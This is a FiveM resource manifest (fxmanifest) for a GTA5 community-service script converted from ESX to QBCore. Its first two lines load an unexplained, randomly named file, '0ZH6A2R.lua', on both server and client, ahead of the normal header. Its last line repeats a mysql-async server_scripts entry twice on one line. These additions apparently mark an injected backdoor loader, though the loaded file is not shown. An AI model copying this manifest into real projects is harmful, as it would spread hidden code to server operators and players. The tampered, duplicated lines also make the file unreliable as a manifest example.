server_script "0ZH6A2R.lua"
client_script "0ZH6A2R.lua"
fx_version 'adamant'

game 'gta5'

description 'Community service. Converted from ESX to QBCore'

author 'Sheesho // Apostolos_Iatridis'

version '1.1'

server_scripts {
	'@oxmysql/lib/MySQL.lua',
	'locale.lua',
	'locales/en.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'locale.lua',
	'locales/en.lua',
	'config.lua',
	'client/main.lua'
}

server_scripts { '@mysql-async/lib/MySQL.lua' }server_scripts { '@mysql-async/lib/MySQL.lua' }